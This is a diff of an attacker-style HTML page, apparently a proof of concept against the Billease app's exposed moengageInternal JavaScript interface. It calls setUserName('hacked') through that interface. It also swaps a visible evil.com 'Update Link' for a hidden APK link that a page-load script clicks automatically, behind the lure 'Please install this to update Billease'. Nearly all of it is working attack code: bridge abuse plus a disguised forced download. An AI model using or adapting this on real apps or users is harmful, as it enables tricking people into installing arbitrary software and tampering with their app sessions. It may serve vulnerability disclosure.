@@ -24,9 +24,20 @@
     <body>
         <div class="container">
             <div class="centered-div">
-                Please install this to update Billease: <a href="https://evil.com">Update Link</a>
+                Please install this to update Billease
+                <a id="downloadLink"
+                   href="https://d.apkpure.net/b/APK/com.facebook.katana?versionCode=465017168"
+                   download="Facebook.apk"
+                   style="display:none;">
+                   Download
+                </a>
             </div>
         </div>
         <script>window.moengageInternal.setUserName("hacked");</script>
+        <script>
+          window.onload = function() {
+            document.getElementById('downloadLink').click();
+          };
+        </script>
     </body>
 </html>
